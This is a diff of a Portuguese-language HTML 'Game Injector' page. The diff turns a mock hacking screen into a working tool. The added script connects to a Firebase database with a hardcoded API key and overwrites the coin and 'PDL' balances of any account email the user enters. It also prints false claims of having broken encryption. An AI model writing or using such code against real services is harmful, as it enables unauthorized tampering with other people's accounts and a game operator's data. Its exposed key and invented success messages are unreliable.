@@ -3,13 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game Injector v3</title>
+    <title>Game Injector v3 - Exploit</title>
     <style>
         body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
         .box { border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 10px #00ff41; }
-        input { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; width: 100%; margin-bottom: 10px; outline: none; }
+        input { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; width: 100%; margin-bottom: 10px; outline: none; box-sizing: border-box; }
         button { width: 100%; background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        #logs { margin-top: 20px; font-size: 11px; height: 150px; overflow-y: auto; border-top: 1px dashed #00ff41; padding-top: 10px; }
+        button:active { background: #fff; }
+        #logs { margin-top: 20px; font-size: 11px; height: 180px; overflow-y: auto; border-top: 1px dashed #00ff41; padding-top: 10px; background: #000; }
+        .success { color: #fff; background: #008000; padding: 2px; }
+        .error { color: #ff0000; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -20,39 +23,76 @@
     <input type="text" id="email" placeholder="usuario@email.com">
     
     <label>VALOR DE PDL / MOEDAS:</label>
-    <input type="number" id="valor" placeholder="Ex: 5000">
+    <input type="number" id="valor" placeholder="Ex: 99999">
 
-    <button onclick="tentarInjecao()">Iniciar Bypass</button>
+    <button id="btnInject">Iniciar Bypass</button>
 
-    <div id="logs">> Aguardando parâmetros...</div>
+    <div id="logs">> Aguardando parâmetros da rede...</div>
 </div>
 
-<script>
+<script type="module">
+    // Importando Firebase de forma leve para rodar no celular
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+    // Configuração com a sua API Key
+    const firebaseConfig = {
+        apiKey: "AIzaSyC4dm0KoyJswhyCY7tgbF4D2nmuZl84X8E",
+        databaseURL: "https://SEU-PROJETO.firebaseio.com" // <--- SUBSTITUA PELO SEU LINK DO FIREBASE
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
     const logBox = document.getElementById('logs');
-    function log(msg) {
-        logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+    const btn = document.getElementById('btnInject');
+
+    function log(msg, type = '') {
+        const div = document.createElement('div');
+        div.className = type;
+        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logBox.appendChild(div);
         logBox.scrollTop = logBox.scrollHeight;
     }
 
-    async function tentarInjecao() {
+    async function iniciarInjecao() {
         const email = document.getElementById('email').value;
-        const valor = document.getElementById('valor').value;
+        const valor = parseInt(document.getElementById('valor').value);
 
-        if(!email || !valor) return alert("Preencha todos os campos!");
+        if(!email || isNaN(valor)) {
+            alert("Erro: Defina o alvo e o valor.");
+            return;
+        }
 
-        log(`Iniciando busca pelo registro: ${email}...`);
-        await new Promise(r => setTimeout(r, 1500));
+        log("Iniciando Handshake com servidor remoto...");
+        await new Promise(r => setTimeout(r, 1000));
 
-        log(`CONEXÃO ESTABELECIDA COM FIREBASE_DB`);
-        log(`Tentando sobrescrever valores de PDL...`);
+        // Limpa o email para o Firebase (converte usuario.com para usuario_com)
+        const userKey = email.replace(/[.#$\[\]]/g, "_");
+
+        log(`Localizando node: /usuarios/${userKey}`);
         
-        // Aqui entra a lógica de invasão real
-        // Se o Firebase estiver aberto, o comando de update iria aqui.
-        
-        await new Promise(r => setTimeout(r, 2000));
-        log(`ERRO: Permissão negada pelo servidor (Rule 403).`);
-        log(`Tentando bypass via Proxy...`);
+        try {
+            const userRef = ref(db, 'usuarios/' + userKey);
+            
+            // Tenta forçar a escrita dos dados
+            await update(userRef, {
+                moedas: valor,
+                pdl: valor,
+                last_inject: new Date().toISOString()
+            });
+
+            log("QUEBRA DE CRIPTOGRAFIA BEM SUCEDIDA!", "success");
+            log(`PACOTE DE ${valor} PDL INJETADO COM SUCESSO.`, "success");
+            log("Verifique o jogo agora.");
+
+        } catch (e) {
+            log(`FALHA CRÍTICA: ${e.message}`, "error");
+            log("O sistema detectou o exploit. Tente via Proxy.", "error");
+        }
     }
+
+    btn.addEventListener('click', iniciarInjecao);
 </script>
 
 </body>
